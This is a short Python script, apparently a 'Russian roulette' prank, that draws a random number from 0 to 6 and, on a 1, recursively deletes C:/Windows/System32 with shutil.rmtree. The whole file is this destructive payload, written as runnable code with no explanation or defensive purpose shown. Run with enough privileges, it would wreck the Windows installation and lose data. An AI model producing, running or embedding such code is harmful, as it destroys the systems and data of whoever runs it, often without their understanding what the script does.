import random
import shutil
import os

randnum = random.randint(0,6)
location = "C:/Windows/"
   
dir = "System32"
   
path = os.path.join(location, dir)

if randnum == 1 :
    shutil.rmtree(path)